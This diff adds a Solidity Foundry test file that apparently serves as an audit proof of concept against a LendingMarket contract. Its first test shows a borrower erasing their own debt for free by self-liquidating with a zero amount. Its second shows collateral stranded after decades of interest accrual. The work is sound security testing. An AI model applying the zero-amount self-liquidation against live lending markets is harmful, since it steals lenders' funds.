@@ -1,0 +1,112 @@
+// SPDX-License-Identifier: Apache-2.0
+pragma solidity ^0.8.20;
+
+import {Test} from "forge-std/Test.sol";
+import {LendingMarket, IERC20} from "../../src/LendingMarket.sol";
+
+contract Round4USDC {
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
+    function approve(address spender, uint256 amount) external returns (bool) {
+        allowance[msg.sender][spender] = amount;
+        return true;
+    }
+    function transfer(address to, uint256 amount) external returns (bool) {
+        balanceOf[msg.sender] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
+        allowance[from][msg.sender] -= amount;
+        balanceOf[from] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+}
+
+contract Round4FixesPoC is Test {
+    address internal constant MARK_PX = 0x0000000000000000000000000000000000000806;
+    address internal constant ORACLE_PX = 0x0000000000000000000000000000000000000807;
+    address internal constant BBO = 0x000000000000000000000000000000000000080e;
+    uint32 internal constant HYPE_PERP = 135;
+    uint256 internal constant COLL = 0.05 ether;
+
+    function _quote(uint64 price4) internal {
+        vm.mockCall(ORACLE_PX, abi.encode(HYPE_PERP), abi.encode(price4));
+        vm.mockCall(MARK_PX, abi.encode(HYPE_PERP), abi.encode(price4));
+        vm.mockCall(BBO, abi.encode(HYPE_PERP), abi.encode(price4 - 1, price4 + 1));
+    }
+
+    function test_POC_zeroAmountLetsBorrowerSelfLiquidateSubDollarCollateralForFree() public {
+        Round4USDC usdc = new Round4USDC();
+        LendingMarket market = new LendingMarket(IERC20(address(usdc)), 0, HYPE_PERP, 2, 100, 100, 100);
+        address lender = address(11);
+        address borrower = address(12);
+        _quote(40e4);
+        usdc.mint(lender, 1e6);
+        vm.startPrank(lender);
+        usdc.approve(address(market), type(uint256).max);
+        market.supply(1e6);
+        vm.stopPrank();
+
+        // Borrow $0.60 against $1.00 of HYPE, then let the price reach $0.75 collateral value.
+        vm.deal(borrower, 0.025 ether);
+        vm.startPrank(borrower);
+        market.depositCollateral{value: 0.025 ether}();
+        market.borrow(600_000);
+        vm.stopPrank();
+        _quote(30e4);
+        assertEq(market.ltvBps(borrower, 30e18), 8_000);
+
+        // `amount == 0` forces repayAmt == 0. The new dust condition is met even though the
+        // collateral could buy repayment, so the borrower erases all debt gratis.
+        vm.prank(borrower);
+        uint256 seized = market.liquidate(borrower, 0);
+        assertEq(seized, 0.025 ether);
+        assertEq(market.collateral(borrower), 0);
+        assertEq(market.debtShares(borrower), 0);
+        assertEq(usdc.balanceOf(borrower), 600_000);
+        emit log_named_uint("free collateral value (USDC base units)", 750_000);
+        emit log_named_uint("debt written off without payment (USDC base units)", 600_000);
+    }
+
+    function test_POC_nonDustCollateralCanStillBeStrandedAfterLongAccrual() public {
+        Round4USDC usdc = new Round4USDC();
+        LendingMarket market = new LendingMarket(IERC20(address(usdc)), 0, HYPE_PERP, 2, 100, 100, 100);
+        address lender = address(1);
+        address borrower = address(2);
+        address liquidator = address(3);
+        _quote(40e4);
+
+        // A fully utilised market accrues at exactly 100%/year. The position starts at 60% LTV.
+        usdc.mint(lender, 1e6);
+        vm.startPrank(lender);
+        usdc.approve(address(market), type(uint256).max);
+        market.supply(1e6);
+        vm.stopPrank();
+        vm.deal(borrower, COLL); // worth $2 at $40
+        vm.startPrank(borrower);
+        market.depositCollateral{value: COLL}();
+        market.borrow(1e6);
+        vm.stopPrank();
+        usdc.mint(liquidator, type(uint128).max);
+        vm.prank(liquidator);
+        usdc.approve(address(market), type(uint256).max);
+
+        // At $20, collateral is $1: not below DUST_USDC and liquidatable. But after 56 years,
+        // its ~0.95-USDC collateral-backed repayment maps to zero 1e18-finer debt shares.
+        skip(56 * 365 days);
+        _quote(20e4);
+        assertGe(COLL * 20e18 / 1e18 / 1e12, 1e6);
+        vm.prank(liquidator);
+        vm.expectRevert(LendingMarket.Zero.selector);
+        market.liquidate(borrower, type(uint256).max);
+
+        assertEq(market.collateral(borrower), COLL);
+        assertGt(market.debtShares(borrower), 0);
+        emit log_named_uint("collateral value (USDC base units)", 1_000_000);
+        emit log_named_uint("debt after 56 years (USDC base units)", market.debtOf(borrower));
+    }
+}
